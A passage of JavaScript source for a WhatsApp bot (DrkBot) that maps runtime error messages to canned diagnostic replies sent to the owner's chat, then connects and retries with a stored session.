                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*ERROR ANALYSIS [DrkBot]*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await DrkBotCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Actualizando la cadena de la versión anterior ...'))
            DrkBotCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await DrkBotCN.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
